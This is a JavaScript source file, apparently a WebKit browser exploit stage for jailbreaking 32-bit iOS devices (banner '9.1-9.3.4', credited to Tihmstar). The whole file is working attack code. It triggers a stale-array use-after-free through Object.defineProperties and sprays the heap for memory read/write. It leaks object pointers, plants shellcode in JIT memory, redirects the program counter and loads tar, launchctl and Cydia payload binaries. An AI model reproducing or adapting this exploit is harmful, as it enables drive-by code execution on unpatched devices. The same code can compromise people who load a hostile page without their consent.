/***
 *     █████╗    ██╗               █████╗    ██████╗ ██╗  ██╗    ██████╗ ██████╗       ██████╗ ██╗████████╗
 *    ██╔══██╗  ███║              ██╔══██╗   ╚════██╗██║  ██║    ╚════██╗╚════██╗      ██╔══██╗██║╚══██╔══╝
 *    ╚██████║  ╚██║    █████╗    ╚██████║    █████╔╝███████║     █████╔╝ █████╔╝█████╗██████╔╝██║   ██║
 *     ╚═══██║   ██║    ╚════╝     ╚═══██║    ╚═══██╗╚════██║     ╚═══██╗██╔═══╝ ╚════╝██╔══██╗██║   ██║
 *     █████╔╝██╗██║               █████╔╝██╗██████╔╝██╗  ██║    ██████╔╝███████╗      ██████╔╝██║   ██║
 *     ╚════╝ ╚═╝╚═╝               ╚════╝ ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚══════╝      ╚═════╝ ╚═╝   ╚═╝
 *
 *      By Tihmstar
 */

module('liblogging');
module('libstorage');

print = alert;

function getArrFromResource(res) {
    while (res.length % 4) {
        res += "A";
    }
    var ret = new Uint32Array(res.length / 4);
    for (var i = 0; i < res.length; i += 4) {
        var word = (res.charCodeAt(i) & 0xff) | ((res.charCodeAt(i + 1) & 0xff) << 8) | ((res.charCodeAt(i + 2) & 0xff) << 16) | ((res.charCodeAt(i + 3) & 0xff) << 24);
        ret[i / 4] = word;
    }
    return ret;
}

function swag() {
    if (bufs[0]) return;
    dgc(); //trigger garbage collector
    for (i = 0; i < bufs.length; i++) {
        bufs[i] = new Uint32Array(0x100 * 2)
        for (k = 0; k < bufs[i].length;) {
            bufs[i][k++] = 0x41414141;
            bufs[i][k++] = 0xffff0000;
        }
    }
    console.log("doneswag");
}

function smashed(stale, tar_ptr, cydia_ptr, launchctl_ptr, offsets_ptr) {
    console.log("smsh len=" + smsh.length);
    console.log("fcp=0x" + fcp.toString(16));
    console.log("binfile=0x" + binfile.toString(16));
    // getJIT
    r2 = smsh[(fcp + 0x14) / 4];
    r3 = smsh[(r2 + 0x10) / 4];
    shellcode = (smsh[(r3 + 0x14) / 4] & 0xfffff000) - 0x10000;
    console.log("r2=0x" + r2.toString(16));
    console.log("r3=0x" + r3.toString(16));
    console.log("shellcode=0x" + shellcode.toString(16));
    console.log("Plant payload3=" + offsets_ptr.toString(16));
    smsh[shellcode / 4] = offsets_ptr;
    shellcode += 4;
    console.log("Plant payload2=" + launchctl_ptr.toString(16));
    smsh[shellcode / 4] = launchctl_ptr;
    shellcode += 4;
    console.log("Plant payload1=" + cydia_ptr.toString(16));
    smsh[shellcode / 4] = cydia_ptr;
    shellcode += 4;
    console.log("Plant payload0=" + tar_ptr.toString(16));
    smsh[shellcode / 4] = tar_ptr;
    shellcode += 4;
    for (var i = 0; i < filestream.length; i += 4) {
        var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
        smsh[(shellcode + i) / 4] = word;
    }
    smsh[(fcp + 0x00) / 4] = fcp + 4;
    smsh[(fcp + 0x04) / 4] = fcp + 4;
    smsh[(fcp + 0x08) / 4] = shellcode + 1; //PC
    smsh[(fcp + 0x30) / 4] = fcp + 0x30 + 4 - 0x18 - 0x34 + 0x8;
    console.log("Do fc() smashed");
    fc();
    console.log("end smashed");
}
//Bit lazy but should work
function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
}

dgc = function() {
    console.log("dgc start");
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = new Uint32Array(0xa000);
    }
    // sleep(1000);
    console.log("dgc done");
};

dgcf = function() {
    console.log("dgcf start");
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = 0
    }
    console.log("dgcf done");
};

function wk91sploit() {
    console.log("going");
    alert("Running stage 1 exploit");
    setTimeout(go_, 100);
}


function swag() {
    if (bufs[0]) return;
    dgc();
    for (i = 0; i < bufs.length; i++) {
        bufs[i] = new Uint32Array(0x100 * 2)
        for (k = 0; k < bufs[i].length;) {
            bufs[i][k++] = 0x41414141;
            bufs[i][k++] = 0xffff0000;
        }
    }
}

function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

function d2u(f) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setFloat64(0, f);
    return _dview.getUint32(0);
}
function go_() {
    var arr = new Array(2047);
    var not_number = {};
    not_number.toString = function() {
        arr = null;
        props["stale"]["value"] = null;
        swag();
        return 10;
    };
    smsh[0] = 0x21212121;
    smsh[1] = 0x31313131;
    smsh[2] = 0x41414141;
    smsh[3] = 0x51515151;
    smsh[4] = 0x61616161;
    smsh[5] = 0x71717171;
    smsh[6] = 0x81818181;
    smsh[7] = 0x91919191;
    var props = {
        p0: {
            value: 0
        },
        p1: {
            value: 1
        },
        p2: {
            value: 2
        },
        p3: {
            value: 3
        },
        p4: {
            value: 4
        },
        p5: {
            value: 5
        },
        p6: {
            value: 6
        },
        p7: {
            value: 7
        },
        p8: {
            value: 8
        },
        length: {
            value: not_number
        },
        stale: {
            value: arr
        },
        after: {
            value: 666
        }
    };
    var target = [];
    var stale = 0;
    var before_len = arr.length;
    console.log("before=" + before_len);
    Object.defineProperties(target, props);
    stale = target.stale;
    console.log("after=" + stale.length);
    if (stale.length != 0x41414141) {
        alert("exploit failed");
        location.reload();
        return;
    }
    var obuf = new Uint32Array(2);
    obuf[0] = 0x41414141;
    obuf[1] = 0xffff0000;
    stale[0] = 0x12345678;
    stale[1] = {};
    for (var z = 0; z < 0x100; z++) fc();
    console.log("pre array");
    for (i = 0; i < bufs.length; i++) {
        var dobreak = 0;
        for (k = 0; k < bufs[0].length; k++) {
            if (bufs[i][k] != obuf[k % 2]) {
                console.log("bufs[i][k]  =0x" + bufs[i][k].toString(16));
                console.log("bufs[i][k+1]=0x" + bufs[i][k + 1].toString(16));
                stale[0] = fc;
                fcp = bufs[i][k];
                stale[0] = filestream;
                binfile = bufs[i][k];
                stale[0] = payload_tar;
                var payload_tar_ptr = bufs[i][k];
                stale[0] = payload_cydia;
                var payload_cydia_ptr = bufs[i][k];
                stale[0] = payload_launchctl;
                var payload_launchctl_ptr = bufs[i][k];
                stale[0] = payload_offsets;
                var payload_offsets_ptr = bufs[i][k];
                stale[0] = smsh;
                var ptrsmsh = bufs[i][k];
                stale[2] = {
                    'a': u2d(0x2, 0x10),
                    'b': smsh,
                    'c': u2d(0, 0),
                    'd': u2d(0, 0)
                }
                stale[0] = {
                    'a': u2d(0, 0x00e00600),
                    'b': u2d(1, 0x10),
                    'c': u2d(bufs[i][k + 2 * 2] + 0x10, 0),
                    'd': u2d(0, 0)
                }
                stale[1] = stale[0];
                bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
                var leak = stale[0][0].charCodeAt(0);
                leak += stale[0][1].charCodeAt(0) << 8;
                leak += stale[0][2].charCodeAt(0) << 16;
                leak += stale[0][3].charCodeAt(0) << 24;
                console.log("leakptr=0x" + leak.toString(16));
                bufs[i][k] -= 0x10;
                stale[0] = {
                    'a': u2d(leak, 0x00602300),
                    'b': u2d(0, 0),
                    'c': smsh,
                    'd': u2d(0, 0)
                }
                stale[1] = stale[0];
                bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
                stale[0][4] = 0;
                stale[0][5] = 0xffffffff;
                bufs[i][k] -= 0x10;
                mem0 = stale[0];
                mem2 = smsh;
                if (smsh.length != 0x10) {
                    alert("Running stage 2 exploit");
                    setTimeout(function() {
                        smashed(stale, payload_tar_ptr, payload_cydia_ptr, payload_launchctl_ptr, payload_offsets_ptr);
                    }, 100);
                }
                dobreak = 1;
                break;
            }
        }
        if (dobreak) break;
    }
    console.log("end");
}
function wk91go() {
    console.log("Downloading resources");
    setTimeout(function() {
        //Start downloading all of the resources.
        filestream = load_binary_resource("payloads/91_934_32/stage1.bin")
        payload_tar = getArrFromResource(load_binary_resource("payloads/91_934_32/tar"))
        payload_launchctl = getArrFromResource(load_binary_resource("payloads/91_934_32/launchctl"))
        payload_offsets = getArrFromResource(load_binary_resource("payloads/91_934_32/offsets.json"))
        console.log("Downloading Cydia");
        setTimeout(function() {
            payload_cydia = getArrFromResource(load_binary_resource("payloads/91_934_32/Cydia.tar"))
            wk91sploit();
        }, 100);
    }, 100);
}
